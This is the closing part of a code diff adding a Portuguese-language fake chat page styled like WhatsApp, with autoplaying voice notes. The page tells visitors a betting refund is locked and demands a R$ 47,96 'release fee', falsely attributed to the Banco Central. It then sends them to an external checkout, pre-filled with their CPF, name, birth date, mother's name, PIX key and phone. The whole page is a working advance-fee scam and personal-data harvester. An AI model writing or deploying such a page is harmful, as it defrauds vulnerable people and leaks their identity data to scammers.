+          { type: 'bot', content: 'De acordo com a Lei nº 14.790/2023, as casas de apostas estão sujeitas às obrigações previstas na legislação quanto à restituição de valores aos apostadores, observadas as hipóteses e condições estabelecidas pela própria lei e pela regulamentação aplicável.', delay: 2000 }
+        ],
+        type: 'button',
+        options: [
+          { label: 'Por que tenho que pagar essa taxa?', next: 'explain_tax' }
+        ]
+      },
+      {
+        id: 'explain_tax',
+        messages: [
+          { type: 'bot', content: 'Seu valor está bloqueado no sistema e <strong>somente você</strong> pode acessá-lo.', delay: 2000 },
+          { type: 'bot', content: animationLock('Valores protegidos por criptografia de ponta a ponta'), delay: 2500 },
+          { type: 'bot', content: 'A Taxa de Liberação de <strong>R$ 47,96</strong> é uma exigência do Banco Central para garantir que o PIX seja enviado à conta correta e evitar fraudes. Sem ela, o saque não pode ser processado.', delay: 3000 },
+          { type: 'bot', content: '<div class="wa-audio-player" data-src="media/audio3.mp3"></div>', delay: 2500 }
+        ],
+        type: 'button',
+        options: [
+          { label: 'Efetuar pagamento do imposto', next: 'generating_checkout' }
+        ]
+      },
+      {
+        id: 'generating_checkout',
+        messages: [
+          { type: 'bot', content: animationSpinner('Gerando guia de pagamento...'), delay: 2000 }
+        ],
+        type: 'redirect',
+redirectUrl: 'https://checkoutseguro.info/checkout/cmvu8xhur035k01okkvagls1s?offer=YGUGWX0&' + window.location.search.replace(/^\?/, '')
+
+      }
+    ];
+
+    function scrollToBottom() {
+      chatContent.scrollTop = chatContent.scrollHeight;
+    }
+
+    function appendMessage(type, content) {
+      const row = document.createElement('div');
+      row.className = `message-row ${type} fadeIn`;
+      let html = (type === 'bot') ? '<div class="avatar"></div>' : '';
+      html += `<div class="bubble">${content}</div>`;
+      row.innerHTML = html;
+      chatContent.appendChild(row);
+      scrollToBottom();
+
+      const images = row.querySelectorAll('img');
+      images.forEach(img => { img.addEventListener('load', scrollToBottom); });
+      setTimeout(scrollToBottom, 300);
+
+      const displayPix = row.querySelector('#display-pix');
+      if (displayPix) displayPix.textContent = state.pixKey;
+      const displayPixFinal = row.querySelector('#display-pix-final');
+      if (displayPixFinal) displayPixFinal.textContent = state.pixKey;
+
+      initWaAudioPlayers(row);
+
+      // 🔥 Anima os contadores que acabaram de entrar no DOM
+      const counters = row.querySelectorAll('.animated-counter:not(.animated)');
+      counters.forEach(el => {
+        el.classList.add('animated');
+        const finalValue = parseFloat(el.dataset.target) || 0;
+        const prefix = el.dataset.prefix || 'R$';
+        let current = 0;
+        const step = finalValue / 40;
+        const interval = setInterval(() => {
+          current += step;
+          if (current >= finalValue) {
+            current = finalValue;
+            clearInterval(interval);
+          }
+          el.textContent = prefix + ' ' + current.toFixed(2)
+            .replace('.', ',')
+            .replace(/\B(?=(\d{3})+(?!\d))/g, '.');
+        }, 40);
+      });
+    }
+
+    function showTyping() {
+      const row = document.createElement('div');
+      row.className = 'message-row bot fadeIn';
+      row.innerHTML = '<div class="avatar"></div><div class="typing"><span></span><span></span><span></span></div>';
+      chatContent.appendChild(row);
+      scrollToBottom();
+      return row;
+    }
+
+    async function runStep(stepIndex) {
+      state.currentStep = stepIndex;
+      const step = flow[stepIndex];
+      controls.innerHTML = '';
+      controls.classList.remove('active');
+
+      if (step.stepDelay) {
+        const typing = showTyping();
+        await new Promise(r => setTimeout(r, step.stepDelay));
+        typing.remove();
+      }
+
+      const TYPING_DURATION = 1200;
+
+      for (let i = 0; i < step.messages.length; i++) {
+        const msg = step.messages[i];
+        const delayTime = msg.delay || 1500;
+
+        if (delayTime > TYPING_DURATION) {
+          await new Promise(r => setTimeout(r, delayTime - TYPING_DURATION));
+          const typing = showTyping();
+          await new Promise(r => setTimeout(r, TYPING_DURATION));
+          typing.remove();
+        } else {
+          const typing = showTyping();
+          await new Promise(r => setTimeout(r, delayTime));
+          typing.remove();
+        }
+
+        appendMessage('bot', msg.content);
+      }
+
+      if (step.type === 'auto_next') {
+        setTimeout(() => {
+          const nextIndex = flow.findIndex(f => f.id === step.next);
+          runStep(nextIndex);
+        }, INTERACTION_DELAY);
+      } else {
+        renderControls(step);
+      }
+    }
+
+    function renderControls(step) {
+      if (step.type === 'button') {
+        const optionsContainer = document.createElement('div');
+        optionsContainer.className = 'chat-options fadeIn';
+
+        step.options.forEach(opt => {
+          const btn = document.createElement('button');
+          btn.textContent = opt.label;
+          btn.onclick = () => {
+            unlockAllAudios();
+            if (opt.action === 'redirect') {
+              window.location.href = 'upsell.html' + window.location.search;
+              return;
+            }
+            optionsContainer.remove();
+            appendMessage('user', opt.label);
+            if (opt.value) state.pixType = opt.value;
+
+            if (opt.value === 'CPF') {
+              state.pixKey = userCPF;
+              setTimeout(() => {
+                appendMessage('user', userCPF);
+                setTimeout(() => {
+                  const nextIndex = flow.findIndex(f => f.id === 'check_pix');
+                  runStep(nextIndex);
+                }, INTERACTION_DELAY);
+              }, INTERACTION_DELAY);
+              return;
+            }
+
+            setTimeout(() => {
+              const nextIndex = flow.findIndex(f => f.id === opt.next);
+              runStep(nextIndex);
+            }, INTERACTION_DELAY);
+          };
+          optionsContainer.appendChild(btn);
+        });
+
+        chatContent.appendChild(optionsContainer);
+        scrollToBottom();
+
+      } else if (step.type === 'input') {
+        controls.classList.add('active');
+        controls.innerHTML = '';
+
+        const wrapper = document.createElement('div');
+        wrapper.className = 'input-wrapper';
+        const input = document.createElement('input');
+        input.type = 'text';
+        input.placeholder = step.placeholder;
+        const btn = document.createElement('button');
+        btn.innerHTML = '<i class="fas fa-paper-plane"></i>';
+
+        const submit = () => {
+          unlockAllAudios();
+          const val = input.value.trim();
+          if (val) {
+            if (step.id === 'type_pix') state.pixKey = val;
+            controls.innerHTML = '';
+            controls.classList.remove('active');
+            appendMessage('user', val);
+            setTimeout(() => {
+              const nextIndex = flow.findIndex(f => f.id === step.next);
+              runStep(nextIndex);
+            }, INTERACTION_DELAY);
+          }
+        };
+        btn.onclick = submit;
+        input.onkeypress = (e) => { if (e.key === 'Enter') submit(); };
+        wrapper.appendChild(input);
+        wrapper.appendChild(btn);
+        controls.appendChild(wrapper);
+
+        setTimeout(() => input.focus(), 300);
+      } else if (step.type === 'redirect') {
+        const typing = showTyping();
+        setTimeout(() => {
+          // Monta os parâmetros para o checkout (auto-preenchimento + UTMs preservadas)
+          const p = new URLSearchParams(paramsCheckout.toString());
+          if (window.getMergedTrackingParams) {
+            const merged = window.getMergedTrackingParams();
+            merged.forEach((val, key) => {
+              if (!p.has(key)) p.set(key, val);
+            });
+          }
+
+          if (userName && userName !== 'Cidadão') {
+            p.set('name', userName);
+            p.set('nome', userName);
+            p.set('nome_completo', userName);
+          }
+          if (userCPF && userCPF !== '***.***.***-**') {
+            const cleanCpf = userCPF.replace(/\D/g, '');
+            p.set('cpf', userCPF);
+            p.set('cpf_limpo', cleanCpf);
+            p.set('document', cleanCpf);
+            p.set('doc', cleanCpf);
+          }
+          if (userBirth && userBirth !== '01/01/1980') {
+            p.set('nascimento', userBirth);
+            p.set('birth', userBirth);
+          }
+          if (userMae) {
+            p.set('mae', userMae);
+          }
+          if (state.pixKey) {
+            p.set('pix', state.pixKey);
+            p.set('chave_pix', state.pixKey);
+            p.set('pixKey', state.pixKey);
+            if (state.pixKey.includes('@')) {
+              p.set('email', state.pixKey);
+            } else {
+              const digits = state.pixKey.replace(/\D/g, '');
+              if (digits.length >= 10 && digits.length <= 11) {
+                p.set('phone', digits);
+                p.set('telephone', digits);
+                p.set('telefone', digits);
+                p.set('celular', digits);
+              }
+            }
+          }
+
+         const baseUrl = 'https://checkoutseguro.info/checkout/cmvu8xhur035k01okkvagls1s';
+p.set('offer', 'YGUGWX0');
+const finalUrl = baseUrl + '?' + p.toString();
+console.log('[Redirecionando para checkout]', finalUrl);
+window.location.href = finalUrl;
+
+        }, 3000);
+      }
+    }
+
+    function initWaAudioPlayers(container) {
+      const players = container.querySelectorAll('.wa-audio-player');
+      players.forEach(p => {
+        if (p.dataset.initialized) return;
+        p.dataset.initialized = 'true';
+
+        const audioSrc = p.dataset.src;
+        const audio = AUDIO_POOL[audioSrc] || new Audio(audioSrc);
+
+        const barHeights = [4, 7, 12, 16, 10, 18, 22, 14, 8, 15, 20, 12, 6, 14, 18, 10, 16, 22, 14, 8, 12, 16, 20, 15, 10, 18, 12, 8, 14, 10, 6, 4];
+        let waveHtml = '';
+        barHeights.forEach(h => { waveHtml += `<div class="wa-bar" style="height:${h}px"></div>`; });
+
+        p.innerHTML = `
+          <button class="wa-play-btn" type="button" aria-label="Reproduzir áudio">
+            <i class="fas fa-play"></i>
+          </button>
+          <div class="wa-wave-container">
+            <div class="wa-wave-bars">${waveHtml}</div>
+            <div class="wa-meta">
+              <span>Mensagem de voz</span>
+              <i class="fas fa-microphone wa-mic-icon"></i>
+            </div>
+          </div>
+        `;
+
+        const playBtn = p.querySelector('.wa-play-btn');
+        const playIcon = playBtn.querySelector('i');
+        const bars = p.querySelectorAll('.wa-bar');
+
+        const updatePlayingState = (isPlaying) => {
+          if (isPlaying) {
+            playBtn.classList.add('playing');
+            playIcon.className = 'fas fa-pause';
+          } else {
+            playBtn.classList.remove('playing');
+            playIcon.className = 'fas fa-play';
+          }
+        };
+
+        playBtn.addEventListener('click', (e) => {
+          e.stopPropagation();
+          unlockAllAudios();
+          if (audio.paused) {
+            stopAllAudios(audio);
+            audio.play().catch(err => console.log('Audio play failed:', err));
+          } else {
+            audio.pause();
+          }
+        });
+
+        audio.addEventListener('play', () => updatePlayingState(true));
+        audio.addEventListener('pause', () => updatePlayingState(false));
+        audio.addEventListener('ended', () => {
+          updatePlayingState(false);
+          bars.forEach(b => b.classList.remove('active'));
+        });
+
+        audio.addEventListener('timeupdate', () => {
+          if (!audio.duration) return;
+          const progress = audio.currentTime / audio.duration;
+          const activeIndex = Math.floor(progress * bars.length);
+          bars.forEach((b, idx) => {
+            if (idx <= activeIndex) { b.classList.add('active'); } else { b.classList.remove('active'); }
+          });
+        });
+
+        const startAutoplay = (attempt = 0) => {
+  stopAllAudios(audio);
+  audio.currentTime = 0;
+  const playPromise = audio.play();
+  if (playPromise !== undefined) {
+    playPromise.then(() => {
+      updatePlayingState(true);
+    }).catch(() => {
+      if (attempt < 3) {
+        setTimeout(() => startAutoplay(attempt + 1), 800);
+      }
+      // Se falhar definitivamente, o botão de play manual continua funcionando
+    });
+  }
+};
+
+setTimeout(() => startAutoplay(), 300);
+      });
+    }
+
+    const INTERACTION_DELAY = 800;
+
+    window.addEventListener('load', () => {
+      setTimeout(() => { runStep(0); }, 1000);
+    });
+  </script>
+
+</body></html>
